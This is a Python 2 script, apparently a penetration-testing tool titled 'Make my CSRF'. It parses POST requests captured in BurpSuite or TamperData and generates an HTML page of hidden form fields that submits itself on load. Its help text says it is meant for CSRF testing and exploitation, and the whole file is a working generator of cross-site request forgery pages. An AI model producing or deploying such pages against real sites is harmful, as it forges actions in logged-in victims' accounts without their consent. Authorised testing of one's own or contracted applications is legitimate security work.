#!/usr/bin/python
import sys
import re
import urllib
import getopt

def usage():
	print "======================================"
	print "           Make my CSRF		     "
	print " author : Mickael Dorigny         "
	print " @MickaelDorigny - http://synetis.com "
	print " http://information-security.fr    "
	print "======================================"
	print "\nHelp :\n"
	print "This tool will help you to create your auto-submit HTML form for CSRF vulnerability testing and exploitation."
	print "It takes input from TamperData or BurpSuite analysis. Just copy/paste the request content in a in.txt file and give it to this script."
	print "\nUsage : python " + sys.argv[0] + " -i <input file> -f <format>"
	print " -f : Data format, possible format are :\n    Burp (for BurpSuite)\n    Tamper (for TamperData - ENG)\n    TamperFR (for TamperData - FR)"
	print " -i : input file containing data"
	print " -o : output file destination, otherwhise output is written in terminal"
	print "\n===================================\nExample :\n"
	print "./makeMyCSRF -i in.txt -f Burp"
	print "./makeMyCSRF -i in.txt -f Tamper"
	return

def processBurpSuite(data):
	''' Process Burp Suite formatted request to build auto submit HTML form'''
	# Extract URL/Server name or IP from data
	servName= re.search("Host: (.*)User-Agent", data, re.IGNORECASE)
	servURL = re.search("POST (.*) HTTP/", data, re.IGNORECASE)
	# Build HTML Form
	output= "<form method=POST action='http://" + servName.group(1) + servURL.group(1)+"'>\n"
	# Extract POST parameters
	parameters = re.search("Connection:.close(.*)$", data, re.IGNORECASE)
	parameters = parameters.group(1)
	parameters = urllib.unquote(parameters.encode('ascii')).decode('utf-8')
	
	# Split each parameter
	tabParameters = parameters.split("&")
	
	# Write input HTML form from parameters
	for parameter in tabParameters:
		tabParam = parameter.split("=")
		output = output +"\t<input type=hidden name='"+tabParam[0]+"'\tvalue='"+tabParam[1]+"'>\n"
	return output

def processTamperData(data):
	''' Process Tamper Data formatted request to build auto submit HTML form '''
	# Extract URL/Server name or IP from data
        servURL = re.search("POST (.*) Load Flag", data, re.IGNORECASE)
	# build HTML form
        output = "<form method=POST action='"+ servURL.group(1)+"'>\n"
  	# Extract POST parameters
	parameters = re.search("Post Data:      (.*)   Response", data, re.IGNORECASE)
        parameters = parameters.group(1)
	parameters = parameters.replace ("      ","&")
        parameters = urllib.unquote(parameters.encode('ascii')).decode('utf-8')

        # Split each parameter
        tabParameters = parameters.split("&")

        # Write input HTML form from parameters
        for parameter in tabParameters:
		tabParamArg = re.search(".*\[(.*)\]$", parameter, re.IGNORECASE)
		paramArg = tabParamArg.group(1)
		tabParamName = re.search("(.*)\[" ,parameter, re.IGNORECASE)
	        output = output +"\t<input type=hidden name='"+tabParamName.group(1)+"'\tvalue='"+tabParamArg.group(1)+"'>\n"
        return output

def processTamperDataFR(data):
        ''' Process Tamper Data formatted request to build auto submit HTML form. Adapation for Tamper Data FR formatted data'''
        # Extract URL/Server name or IP from data
        servURL = re.search("POST (.*) Indicateur", data, re.IGNORECASE)
        # build HTML form
        output = "<form method=POST action='"+ servURL.group(1)+"'>\n"
        # Extract POST parameters
        parameters = re.search("es POST:      (.*)   En-t", data, re.IGNORECASE)
        parameters = parameters.group(1)
        parameters = parameters.replace ("      ","&")
        parameters = urllib.unquote(parameters.encode('ascii')).decode('utf-8')

        # Split each parameter
        tabParameters = parameters.split("&")

        # Write input HTML form from parameters
        for parameter in tabParameters:
                tabParamArg = re.search(".*\[(.*)\]$", parameter, re.IGNORECASE)
                paramArg = tabParamArg.group(1)
                tabParamName = re.search("(.*)\[" ,parameter, re.IGNORECASE)
                output = output +"\t<input type=hidden name='"+tabParamName.group(1)+"'\tvalue='"+tabParamArg.group(1)+"'>\n"
        return output



myopts, args = getopt.getopt(sys.argv[1:], "i:o:f:h")
outputFile=""

# Option processing part
if len(sys.argv) > 2:
        inputFile = sys.argv[1]
        dataFormat = sys.argv[2]
else:
	usage()
        exit(0)
for o, a in myopts:
	if o == "-o":
		outputFile = a
	if o == "-h":
		usage()
		exit(0)		
	if o == "-i":
		inputFile = a
	if o == "-f":
		dataFormat = a

dataToProcess = ""
# Process data to delete return and space. 
# more easy to retrieve parameters then.
inFile = open(inputFile)

htmlForm = "<html><body> \n"

# Remove space and return
for line in inFile:
    dataToProcess = dataToProcess + line.rstrip('\r\n')

# Process data according to specified format
if dataFormat == "Burp":
	htmlForm = htmlForm + processBurpSuite (dataToProcess)
elif dataFormat == "Tamper":
	htmlForm = htmlForm + processTamperData (dataToProcess)
elif dataFormat == "TamperFR":
	htmlForm = htmlForm + processTamperDataFR (dataToProcess)
else :
	print "Please specifiy an available data format"
	usage()
	exit(0)

# Add end of HTML form
htmlForm = htmlForm +"\t<input style=\"display:none\" type=submit>\n<form>\n<script>document.forms[0].submit();</script>\n</body></html>"

# If an output file is specified, write form in it
if outputFile != "":
	file = open(outputFile, "w")
	file.write(htmlForm)
	file.close()
	print "Your HTML from is in this file : "+outputFile
# Otherwise, write output in terminal directly
else:
	print htmlForm
